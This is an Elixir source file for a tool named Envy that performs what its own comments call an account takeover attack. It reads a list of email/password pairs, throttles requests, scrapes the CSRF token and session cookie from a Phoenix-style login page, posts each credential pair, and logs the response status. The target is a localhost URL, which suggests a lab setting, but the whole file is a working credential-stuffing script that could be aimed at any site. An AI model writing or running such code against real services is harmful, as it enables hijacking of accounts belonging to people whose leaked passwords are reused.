defmodule Envy do
  @url "http://localhost:4000/users/log_in"
  @headers [{"Content-Type", "application/x-www-form-urlencoded"}]

  # The main function you call to perform an account takeover attack
  #
  # login_pairs is a list of tuples, for example:
  # [{"corvid@example.com", "corvidPass2022"}, ...]
  # 
  # requests_per_minute is the limit on how many http requests will be sent
  # in a 60 second period. Defaults to 60 (one request per second)
  @spec ato(list(), non_neg_integer()) :: list()
  def ato(login_pairs, requests_per_minute \\ 60) do
    do_ato(login_pairs, convert_rpm(requests_per_minute))
    |> Enum.map(&Task.await/1)
  end
  
  def do_ato([], _sleep), do: []
  def do_ato([h|t], sleep_n) do
    Process.sleep(sleep_n)
    [Task.async(fn -> try_login(h) end) | do_ato(t, sleep_n)]
  end
  
  # Convert requests per minute into milliseconds for Process.sleep()
  @spec convert_rpm(non_neg_integer()) :: non_neg_integer()
  def convert_rpm(rpm) do
    (1000 * (60 / rpm)) |> trunc()
  end

  def try_login([email, password]) do
    [user, domain] = String.split(email, "@")
    try_login(user, domain, password)
  end
  
  def try_login(email_name, email_domain, password) do
    tc = get_time_cred(email_name, email_domain, password)

    with {:ok, r} <- HTTPoison.get("http://localhost:4000/users/log_in"),
         {:ok, html} <- Floki.parse_document(r.body)
    do
      process_response(r, html, email_name, email_domain, password, tc)
    else
      _ ->
        tc <> " error, GET or parsing failed\n"
    end
  end
  
  def process_response(r, html, email_name, email_domain, password, tc) do
    case Floki.find(html, "[name=_csrf_token") do
      [] ->
        tc <> " error, no csrf token"
      [{_, [_,_,{_v, csrf_token}], []}] ->
        cookie = get_cookie(r)
        post_body = get_post_body(csrf_token, email_name, email_domain, password)
        case HTTPoison.post(@url, post_body, @headers, hackney: [cookie: [cookie]]) do
          {:ok, pr} ->
            tc <> " Login POST status #{pr.status_code}\n"
          _ ->
            tc <> " Login POST failed\n"
        end
    end
  end
  
  def get_post_body(csrf_token, email_name, email_domain, password) do
    "_csrf_token=#{csrf_token}&user%5Bemail%5D=#{email_name}%40#{email_domain}&user%5Bpassword%5D=#{password}&user%5Bremember_me%5D=false"
  end
  
  def get_cookie(response) do
    {_, cookie} = 
      response.headers
      |> Enum.find(fn {x, _} -> x == "set-cookie" end)
    cookie
  end
  
  def get_time_cred(email_name, email_domain, password) do
    "#{NaiveDateTime.local_now()} #{email_name}@#{email_domain}/#{password} "
  end
end
